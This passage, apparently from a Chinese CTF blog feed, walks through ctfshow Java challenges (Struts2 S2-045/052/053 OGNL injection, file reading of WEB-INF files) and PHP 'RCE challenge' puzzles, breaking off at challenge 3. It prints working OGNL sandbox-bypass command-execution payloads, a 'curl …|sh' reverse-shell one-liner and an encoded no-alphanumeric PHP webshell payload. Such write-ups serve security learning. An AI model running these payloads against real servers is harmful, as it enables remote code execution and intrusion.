alt="image-20230223224214133"></p><p>以第一个参数为攻击点，在其执行OGNL语法，${10-7}，点击submit</p><p><img src="../images/image-20230223224230773.png" alt="image-20230223224230773"></p><p><img src="../images/image-20230223224302364.png" alt="image-20230223224302364"></p><p>成功执行了</p><p>借用S2-045的沙盒绕过方法，改了一个POC。将如下POC填入表单<code>Gengster Name</code>中，提交即可直接回显命令执行的结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(<span class="meta">@com</span>.opensymphony.xwork2.ognl.OgnlUtil<span class="meta">@class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())</span>).(#q)&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230223225251474.png" alt="image-20230223225251474"></p><p>也可以使用s2-045poc，抓包修改content-type</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(<span class="meta">@com</span>.opensymphony.xwork2.ognl.OgnlUtil<span class="meta">@class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=<span class="string">&#x27;id&#x27;</span>).(#iswin=(<span class="meta">@java</span>.lang.System<span class="meta">@getProperty(&#x27;os.name&#x27;)</span>.toLowerCase().contains(<span class="string">&#x27;win&#x27;</span>))).(#cmds=(#iswin?&#123;<span class="string">&#x27;cmd.exe&#x27;</span>,<span class="string">&#x27;/c&#x27;</span>,#cmd&#125;:&#123;<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,#cmd&#125;)).(#p=<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(<span class="literal">true</span>)).(#process=#p.start()).(#ros=(<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getResponse()</span>.getOutputStream())).(<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@copy(#process.getInputStream(),#ros)</span>).(#ros.flush())&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web296-S2-052"><a href="#web296-S2-052" class="headerlink" title="web296-S2-052"></a>web296-S2-052</h2><p>题目</p><p><img src="../images/image-20230223225504667.png" alt="image-20230223225504667"></p><p><strong>漏洞原理</strong></p><p><img src="../images/image-20230223225531458.png" alt="image-20230223225531458"></p><p>还是得用工具，但是得反弹shell，因为env太长了，有长度限制，只输出半截</p><p><img src="../images/image-20230223225835015.png" alt="image-20230223225835015"></p><p>这里的话得需要s2-045漏洞</p><h2 id="web297-S2-053"><a href="#web297-S2-053" class="headerlink" title="web297-S2-053"></a>web297-S2-053</h2><p>题目</p><p><img src="../images/image-20230223230033073.png" alt="image-20230223230033073"></p><p><strong>漏洞原理</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(<span class="meta">@com</span>.opensymphony.xwork2.ognl.OgnlUtil<span class="meta">@class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=<span class="string">&#x27;id&#x27;</span>).(#iswin=(<span class="meta">@java</span>.lang.System<span class="meta">@getProperty(&#x27;os.name&#x27;)</span>.toLowerCase().contains(<span class="string">&#x27;win&#x27;</span>))).(#cmds=(#iswin?&#123;<span class="string">&#x27;cmd.exe&#x27;</span>,<span class="string">&#x27;/c&#x27;</span>,#cmd&#125;:&#123;<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,#cmd&#125;)).(#p=<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(<span class="literal">true</span>)).(#process=#p.start()).(<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(#process.getInputStream())</span>)&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>还是得反弹shell.</p><p>就是先利用工具，查找存在哪些漏洞，然后就去利用执行这个漏洞，然后就输入下面的curl命令就可以了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://your-shell.com/你的公网ip冒号你的开放端口空格|sh</span><br></pre></td></tr></table></figure><p>这就是反弹shell的方法，其实还有很多种语言的反弹shell的方法</p><p>your-shell ——&gt;这个是反弹工具网址</p><p>在b站的  <a href="https://www.bilibili.com/video/BV13P4y1M7EF/?spm_id_from=333.337.search-card.all.click&amp;vd_source=bacfffe46b930fda5761b63367eb298c">反弹shell讲解</a> </p><h2 id="web298-反编译"><a href="#web298-反编译" class="headerlink" title="web298-反编译"></a>web298-反编译</h2><p>题目</p><p><img src="../images/image-20230223231242469.png" alt="image-20230223231242469"></p><p><strong>题目附件一个war包</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jar包和war包都可以看成压缩文件，都可以用解压软件打开，jar包和war包都是为了项目的部署和发布，通常在打包部署的时候，会在里面加上部署的相关信息。这个打包实际上就是把代码和依赖的东西压缩在一起，变成后缀名为.jar和.war的文件，就是我们说的jar包和war包。但是这个“压缩包”可以被编译器直接使用，把war包放在tomcat目录的webapp下，tomcat服务器在启动的时候可以直接使用这个war包。通常tomcat的做法是解压，编译里面的代码，所以当文件很多的时候，tomcat的启动会很慢。</span><br><span class="line"></span><br><span class="line">jar包和war包的区别：jar包是java打的包，war包可以理解为javaweb打的包，这样会比较好记。jar包中只是用java来写的项目打包来的，里面只有编译后的class和一些部署文件。而war包里面的东西就全了，包括写的代码编译成的class文件，依赖的包，配置文件，所有的网站页面，包括html，jsp等等。一个war包可以理解为是一个web项目，里面是项目的所有东西。</span><br></pre></td></tr></table></figure><p>使用工具<a href="https://github.com/java-decompiler/jd-gui/releases">Java decompiler</a>反编译class文件</p><p><img src="../images/image-20230224191707065.png" alt="image-20230224191707065"></p><p><img src="../images/image-20230224191718054.png" alt="image-20230224191718054"></p><p>查看源码发现两个函数，只要username=admin&amp;password=ctfshow的话，这个函数就会返回true,然后就会打印flag.</p><h2 id="web299-文件读取"><a href="#web299-文件读取" class="headerlink" title="web299-文件读取"></a>web299-文件读取</h2><p>题目</p><p><img src="../images/image-20230224201233523.png" alt="image-20230224201233523"></p><p>发现了一个题目给的注释，然后去尝试了一下发现是可以进行文件读取的。</p><p>这里的话给的是php，但是在java中，默认的文件应该是<code>index.jsp</code></p><p><img src="../images/image-20230224201453984.png" alt="image-20230224201453984"></p><p>去读WEB-INF/web.xml，发现存在con.ctfshow.servlet.GetFlag</p><p><img src="../images/image-20230224201722256.png" alt="image-20230224201722256"></p><p>这个路径是根据上一题的java文件得出的  <strong>一般来说 web.xml都是在这个路径下</strong></p><p>这里的 <strong>web.xml</strong>  可以看这篇文章来进行学习学习  <a href="https://www.cnblogs.com/linhuaming/p/9464356.html">文章</a></p><p>进行 web.xml的读取</p><p><img src="../images/image-20230224202057625.png" alt="image-20230224202057625"></p><p>然后进行读取WEB-INF/classes/com/ctfshow/servlet/GetFlag.class，因为是class文件字符有点乱，发现fl3g</p><p>这里为什么是这个路径的话，是因为上一题的java压缩包里的路径，然后就根据其推断出。</p><p><img src="../images/image-20230224202206393.png" alt="image-20230224202206393"></p><p>但是   是不是所有的默认文件都是这个路径的话我就不知道了，因为刚开始学java</p><p><img src="../images/image-20230224202349505.png" alt="image-20230224202349505"></p><p>发现这个flag所在的文件</p><p>然后进行读取</p><p><img src="../images/image-20230224202445941.png" alt="image-20230224202445941"></p><h2 id="web300-文件读取"><a href="#web300-文件读取" class="headerlink" title="web300-文件读取"></a>web300-文件读取</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 10:52:43</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 10:54:20</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解题方法和上题一样，</p><p><img src="../images/image-20230224202801282.png" alt="image-20230224202801282"></p><p>java漏洞就大概了解完了，那么我们就开始去学习java反序列化，边做题边学习java了。</p><p><strong>以上的题目如果输入env只出来半截的，可以去看我写的web297的题解</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;脚本通杀&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;  &lt;strong&gt;WEB279-294 296-297&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;以下题目参考 ——&amp;gt; &lt;a href=&quot;https://blog.csdn.net/q20010619/article/</summary>
      
    
    
    
    
    <category term="ctfshow java 刷题记录" scheme="https://ke1nys.github.io/tags/ctfshow-java-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-RCE极限挑战</title>
    <link href="https://ke1nys.github.io/posts/aeb7a8fc.html"/>
    <id>https://ke1nys.github.io/posts/aeb7a8fc.html</id>
    <published>2023-02-20T11:44:02.000Z</published>
    <updated>2023-02-21T10:37:42.439Z</updated>
    
    <content type="html"><![CDATA[<h2 id="RCE挑战1"><a href="#RCE挑战1" class="headerlink" title="RCE挑战1"></a>RCE挑战1</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;(&quot;</span>,<span class="string">&quot;括号&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;点&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里只是把().给过滤掉了，直接使用不带点和括号的RCE方式就可以了，比如日志文件包含，临时文件包含</p><p>还有更简单的</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=<span class="keyword">echo</span> `<span class="variable">$_POST</span>[<span class="number">1</span>]`;&amp;<span class="number">1</span>=cat /f*</span><br></pre></td></tr></table></figure><h2 id="RCE挑战2"><a href="#RCE挑战2" class="headerlink" title="RCE挑战2"></a>RCE挑战2</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>python脚本</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$a</span> = <span class="number">0</span>; <span class="variable">$a</span> &lt; <span class="number">256</span>; <span class="variable">$a</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>)).<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跑了一下正则，才发现只有这几个东西能进行利用</p><p><img src="../images/image-20230220195106844.png" alt="image-20230220195106844"></p><p>这道题利用的是<strong>自增rce</strong></p><p>p牛之前的文章也写过这个</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></p><p>思路就是，我们rce需要字母，但字母都过滤了，所以我们就要想办法去构造字母，p神是用</p><p>强制连接数组和字符串，数组将被转换成字符串，其值为<code>Array，而我们如果取Array的第[0]</code>个字母的话就是A，而A++就是B</p><p><img src="../images/37853e892a9643ac805787746756841c.png" alt="img"></p><p><strong>payload1</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_=[].<span class="string">&#x27;&#x27;</span>;  //得到Array</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_=<span class="variable">$_</span>[<span class="string">&#x27;/&#x27;</span>==<span class="string">&#x27;+&#x27;</span>];   //让[]里的值报错返回0,取Array[0]=A，此时<span class="variable">$_</span>=A</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____=<span class="string">&#x27;_&#x27;</span>;   //让<span class="variable">$____</span>=_，后面容易拼接</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__=<span class="variable">$_</span>;   //将A赋给<span class="variable">$__</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;  //A自增到G，此时<span class="variable">$__</span>=G</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____.=<span class="variable">$__</span>; //将_和G拼接起来，此时<span class="variable">$____</span>=_G</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__=<span class="variable">$_</span>;   //再将<span class="variable">$__</span>还原成A</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;  //A自增到E,此时__=E</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____.=<span class="variable">$__</span>;  //E和_G拼接，此时<span class="variable">$____</span>为_GE</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__=<span class="variable">$_</span>;  //再将__换源成A</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;  //A自增成T此时__=T</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____.=<span class="variable">$__</span>;  //再拼接成_GET，此时<span class="variable">$____</span>=_GET</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_=<span class="variable">$____</span>;   //为了方便起见，我们把____换成_</span></span><br><span class="line"><span class="meta prompt_">($</span><span class="language-bash"><span class="variable">$_</span>[_])($<span class="variable">$_</span>[__]);  //拼成我们想要的(<span class="variable">$_GET</span>[_])(<span class="variable">$_GET</span>[__]),传入_和__命令执行即可</span>  </span><br></pre></td></tr></table></figure><p><strong>payload2</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_=[].<span class="string">&#x27;&#x27;</span>;//Array</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_=<span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;$&#x27;</span>];//A</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____=<span class="string">&#x27;_&#x27;</span>;//_</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__=<span class="variable">$_</span>;//A</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;//P</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____.=<span class="variable">$__</span>;//_P</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__=<span class="variable">$_</span>;//A</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;//O</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____.=<span class="variable">$__</span>;//_PO</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__=<span class="variable">$_</span>;//A</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;//S</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____.=<span class="variable">$__</span>;//_POS</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__=<span class="variable">$_</span>;//A</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;//T</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____.=<span class="variable">$__</span>;//_POST</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_=<span class="variable">$____</span>;//_POST</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="variable">$_</span>[__]($<span class="variable">$_</span>[_]);//<span class="variable">$_POST</span>[__](<span class="variable">$_POST</span>[_]);</span></span><br></pre></td></tr></table></figure><p>这里为什么能用自增是因为$_是会记录上一次的值</p><p><strong>最终paylaod</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=%24%5F%3D%5B%5D%2E%27%27%3B%24%5F%3D%24%5F%5B%27%27%3D%3D%27%24%27%5D%3B%24%5F%5F%5F%5F%3D%27%5F%27%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%3D%24%5F%5F%5F%5F%3B%24%24%5F%5B%5F%5F%5D%28%24%24%5F%5B%5F%5D%29%3B&amp;__=system&amp;_=cat /f1agaaa</span><br></pre></td></tr></table></figure><h2 id="RCE挑战3"><a href="#RCE挑战3" class="headerlink" title="RCE挑战3"></a>RCE挑战3</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span 